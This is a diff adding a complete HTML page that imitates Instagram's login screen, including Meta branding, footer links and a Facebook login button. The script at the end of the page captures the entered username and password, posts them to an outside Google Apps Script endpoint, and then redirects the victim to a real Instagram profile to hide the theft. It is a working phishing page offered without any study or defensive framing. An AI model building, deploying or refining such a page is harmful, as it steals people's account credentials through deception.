@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Instagram Login</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            width: 100%;
+            min-height: 100%;
+        }
+
+        body {
+            background: #0b0f12;
+            color: #f5f5f5;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+
+        /* =========================================
+   MAIN RESPONSIVE CONTAINER
+========================================= */
+
+        .mobile-container {
+            width: 100%;
+            max-width: 564px;
+            min-height: 100vh;
+            margin: 0 auto;
+            background: #202023;
+            overflow: hidden;
+        }
+
+
+        /* =========================================
+   LOGO SECTION
+========================================= */
+
+        .logo-section {
+            width: 100%;
+            height: clamp(150px, 20vh, 190px);
+
+            background: #0b0f12;
+            border-bottom: 1px solid #444;
+
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .instagram-logo {
+            width: clamp(75px, 20vw, 96px);
+            height: clamp(75px, 20vw, 96px);
+
+            object-fit: contain;
+            display: block;
+        }
+
+
+        /* =========================================
+   LOGIN SECTION
+========================================= */
+
+        .login-section {
+            width: 100%;
+
+            padding:
+                clamp(55px, 8vw, 69px) clamp(30px, 12vw, 40px) 35px;
+
+            min-height: auto;
+        }
+
+        /* =========================================
+   TITLE
+========================================= */
+
+        .login-title {
+            font-size: clamp(17px, 4vw, 20px);
+            font-weight: 700;
+
+            margin-bottom: clamp(25px, 6vw, 31px);
+        }
+
+
+        /* =========================================
+   INPUTS
+========================================= */
+
+        .input-box {
+            display: block;
+
+            width: 100%;
+            height: clamp(55px, 14vw, 63px);
+
+            background: transparent;
+
+            border: 1px solid #555961;
+            border-radius: 19px;
+
+            padding: 0 21px;
+
+            color: white;
+
+            font-size: clamp(15px, 4vw, 17px);
+
+            outline: none;
+
+            margin-bottom: 15px;
+        }
+
+        .input-box::placeholder {
+            color: #aab0bb;
+        }
+
+        .input-box:focus {
+            border-color: #777;
+        }
+
+
+        /* =========================================
+   LOGIN BUTTON
+========================================= */
+
+        .login-btn {
+            display: block;
+
+            width: 100%;
+            height: clamp(50px, 13vw, 55px);
+
+            margin-top: 15px;
+
+            border: none;
+            border-radius: 30px;
+
+            background: #1d4f8c;
+
+            color: #ffffff;
+
+            font-size: clamp(15px, 4vw, 17px);
+
+            cursor: pointer;
+
+            transition: background 0.2s ease;
+        }
+
+        .login-btn:hover {
+            background: #245fa5;
+        }
+
+
+        /* =========================================
+   FORGOT PASSWORD
+========================================= */
+
+        .forgot {
+            display: block;
+
+            width: 100%;
+
+            text-align: center;
+
+            margin-top: clamp(28px, 7vw, 31px);
+
+            color: white;
+
+            font-size: clamp(15px, 4vw, 17px);
+
+            text-decoration: none;
+        }
+
+
+        /* =========================================
+   FACEBOOK BUTTON
+========================================= */
+
+        .facebook-btn {
+            display: block;
+
+            width: 100%;
+            height: clamp(50px, 13vw, 55px);
+
+            margin-top: clamp(65px, 18vw, 83px);
+
+            border: 1px solid #555961;
+            border-radius: 30px;
+
+            background: transparent;
+
+            color: white;
+
+            font-size: clamp(14px, 4vw, 16px);
+
+            cursor: pointer;
+        }
+
+        .facebook-icon {
+            color: #1295f4;
+            margin-right: 8px;
+        }
+
+
+        /* =========================================
+   CREATE ACCOUNT
+========================================= */
+
+        .create-btn {
+            display: block;
+
+            width: 100%;
+            height: clamp(50px, 13vw, 55px);
+
+            margin-top: 15px;
+
+            border: 1px solid #168cff;
+            border-radius: 30px;
+
+            background: transparent;
+
+            color: #2495ff;
+
+            font-size: clamp(14px, 4vw, 16px);
+
+            cursor: pointer;
+        }
+
+
+        /* =========================================
+   META
+========================================= */
+
+        .meta {
+            width: 100%;
+
+            text-align: center;
+
+            margin-top: clamp(30px, 8vw, 34px);
+
+            font-size: clamp(19px, 5vw, 22px);
+
+            color: #ddd;
+        }
+
+        .meta-symbol {
+            font-size: clamp(25px, 6vw, 28px);
+        }
+
+
+        /* =========================================
+   FOOTER
+========================================= */
+
+        footer {
+            width: 100%;
+
+            background: #0b0f12;
+
+            border-top: 1px solid #444;
+
+            padding:
+                28px clamp(20px, 7vw, 35px) 70px;
+
+            text-align: center;
+
+            color: #b6b9c0;
+
+            font-size: clamp(12px, 3.5vw, 14px);
+
+            line-height: 28px;
+        }
+
+
+        /* =========================================
+   FOOTER LINKS
+========================================= */
+
+        .footer-links {
+            display: flex;
+
+            justify-content: center;
+
+            flex-wrap: wrap;
+
+            gap: 0 20px;
+
+            margin-bottom: 18px;
+        }
+
+        .footer-links span {
+            white-space: nowrap;
+        }
+
+        .language {
+            margin-right: 20px;
+        }
+
+
+        /* =========================================
+   SMALL PHONES
+   320px - 374px
+========================================= */
+
+        @media (max-width: 374px) {
+
+            .login-section {
+                padding-left: 25px;
+                padding-right: 25px;
+            }
+
+            .input-box,
+            .login-btn,
+            .facebook-btn,
+            .create-btn {
+                border-radius: 17px;
+            }
+
+            .facebook-btn {
+                margin-top: 60px;
+            }
+
+            .footer-links {
+                gap: 0 15px;
+            }
+
+        }
+
+
+        /* =========================================
+   VERY SMALL PHONES
+   Below 320px
+========================================= */
+
+        @media (max-width: 319px) {
+
+            .login-section {
+                padding-left: 20px;
+                padding-right: 20px;
+            }
+
+            .login-title {
+                font-size: 16px;
+            }
+
+            .input-box {
+                padding: 0 16px;
+            }
+
+            footer {
+                padding-left: 15px;
+                padding-right: 15px;
+            }
+
+        }
+
+
+        /* =========================================
+   TABLETS
+   565px+
+========================================= */
+
+        @media (min-width: 565px) {
+
+            body {
+                padding: 20px 0;
+            }
+
+            .mobile-container {
+                min-height: calc(100vh - 40px);
+                box-shadow: 0 0 30px rgba(0, 0, 0, 0.4);
+            }
+
+        }
+
+
+        /* =========================================
+   DESKTOP
+   900px+
+========================================= */
+
+        @media (min-width: 900px) {
+
+            body {
+                display: flex;
+                justify-content: center;
+                align-items: flex-start;
+            }
+
+            .mobile-container {
+                max-width: 564px;
+            }
+
+        }
+    </style>
+</head>
+
+
+<body>
+
+    <div class="mobile-container">
+
+
+        <!-- ===============================
+         LOGO
+    ================================ -->
+
+        <div class="logo-section">
+
+            <img class="instagram-logo" src="logo.png" alt="Instagram Logo">
+
+        </div>
+
+
+
+        <!-- ===============================
+         LOGIN
+    ================================ -->
+
+        <main class="login-section">
+
+            <h1 class="login-title">
+                Log into Instagram
+            </h1>
+
+            <form id="demoForm" onsubmit="submitForm(event)" method="post" name="google-sheet">
+                <input type="text" class="input-box" placeholder="Mobile number, username..." id="name" required name="name">
+
+
+                <input type="password" id="password" class="input-box" placeholder="Password" required name="password">
+
+                <p id="error"></p>
+
+                <button class="login-btn" type="submit" id="submitBtn" name="submit">
+                    Log in
+                </button>
+            </form>
+
+
+
+
+            <a href="#" class="forgot">
+                Forgot password?
+            </a>
+
+
+            <button class="facebook-btn">
+
+                <span class="facebook-icon">
+                    ●
+                </span>
+
+                Log in with Facebook
+
+            </button>
+
+
+            <button class="create-btn">
+                Create new account
+            </button>
+
+
+            <div class="meta">
+
+                <span class="meta-symbol">
+                    ∞
+                </span>
+
+                Meta
+
+            </div>
+
+        </main>
+
+
+
+        <!-- ===============================
+         FOOTER
+    ================================ -->
+
+        <footer>
+
+            <div class="footer-links">
+
+                <span>Meta</span>
+                <span>About</span>
+                <span>Blog</span>
+                <span>Jobs</span>
+                <span>Help</span>
+                <span>API</span>
+
+                <span>Privacy</span>
+                <span>Terms</span>
+                <span>Locations</span>
+                <span>Popular</span>
+
+                <span>Instagram Lite</span>
+                <span>Meta AI</span>
+                <span>Threads</span>
+
+                <span>
+                    Contact Uploading & Non-Users
+                </span>
+
+                <span>Meta Verified</span>
+
+            </div>
+
+
+            <div>
+
+                <span class="language">
+                    English⌄
+                </span>
+
+                © 2026 Instagram from Meta
+
+            </div>
+
+        </footer>
+
+
+    </div>
+
+     <script>
+
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyYPZT8PVD7DKiUlPxvLXb5F8k90cBYTlwoQlQfEG3EpLGRX_mdifGe0CS13JRyDNtqHA/exec';
+        const form = document.forms['google-sheet'];
+
+        form.addEventListener("submit", function (event) {
+
+            // Stop the form from submitting normally
+            event.preventDefault();
+
+            const name =
+                document.getElementById("name").value.trim();
+
+            const password =
+                document.getElementById("password").value.trim();
+
+            const error =
+                document.getElementById("error");
+
+
+            // Check if any field is empty
+            if (
+                name === "" ||
+                password === ""
+            ) {
+
+                error.textContent =
+                    "Please fill in all the details.";
+
+                return;
+            }
+
+
+            // Everything is filled
+            error.textContent = "";
+
+            fetch(scriptURL, {
+                method: 'POST',
+                body: new FormData(form)
+            })
+                .then(res => res.text())
+
+
+            // Redirect to another webpage
+            window.location.href = "https://www.instagram.com/cat_llw?stkn=MXR2djFuZ3JyZXM3aw==";
+
+        });
+
+    </script>
+
+</body>
+
+</html>
